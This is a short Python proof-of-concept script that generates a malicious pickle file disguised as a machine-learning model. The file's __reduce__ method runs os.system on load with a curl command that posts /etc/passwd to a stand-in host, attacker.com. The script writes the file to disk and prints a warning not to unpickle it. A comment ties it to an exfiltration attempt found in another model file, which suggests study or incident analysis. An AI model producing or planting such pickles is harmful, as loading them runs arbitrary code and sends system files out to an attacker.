import os
import pickle

class MaliciousModel:
    """
    A Proof of Concept (POC) demonstrating how arbitrary code execution
    can be embedded within a Python Pickle file.
    
    When this class is pickled, the __reduce__ method tells the pickler
    how to reconstruct the object. During unpickling, the os.system command
    is executed with the provided arguments.
    """
    def __reduce__(self):
        # This payload matches the exfiltration attempt found in model_review_v2.pkl
        payload = "curl http://attacker.com/exfil -d @/etc/passwd"
        return (os.system, (payload,))

if __name__ == "__main__":
    print("[*] Generating malicious pickle payload...")
    
    # Serialize the malicious object
    malicious_data = pickle.dumps(MaliciousModel())
    
    # Write to a file mimicking a machine learning model
    output_filename = "malicious_model_poc.pkl"
    with open(output_filename, "wb") as f:
        f.write(malicious_data)
        
    print(f"[+] Payload successfully written to {output_filename}")
    print("[!] WARNING: Do not unpickle this file on your host machine!")
